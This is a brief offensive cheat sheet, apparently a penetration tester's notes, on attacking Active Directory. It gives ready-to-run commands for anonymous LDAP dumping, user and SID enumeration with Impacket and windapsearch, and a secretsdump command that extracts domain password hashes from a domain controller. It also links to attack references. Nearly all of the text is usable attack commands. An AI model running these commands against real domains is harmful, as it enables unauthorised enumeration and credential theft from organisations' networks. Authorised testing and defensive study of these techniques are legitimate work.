# Note: Be careful with brute forcing AD as you can disable user accounts due to the Account Lockout Policy. 


Anonymous Credential LDAP Dumping: 

- ldapsearch -LLL -x -H ldap://<domain fqdn> -b ‘’ -s base ‘(objectclass=*)’

Impacket GetADUsers.py (Must have valid credentials)

- GetADUsers.py -all <domain\User> -dc-ip <DC_IP>

Impacket lookupsid.py:

- /usr/share/doc/python3-impacket/examples/lookupsid.py username:password@172.21.0.0

Impacket Secretdump:

python3 secretdump.py 'breakme.local/Administrator@172.21.0.0' -just-dc-user anakin

Windapsearch:

https://github.com/ropnop/windapsearch 

- python3 windapsearch.py -d host.domain -u domain\\ldapbind -p PASSWORD -U



## References: 

- PayloadAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#most-common-paths-to-ad-compromise

- Attacking Active Directory: 0 to 0.9:
https://zer1t0.gitlab.io/posts/attacking_ad/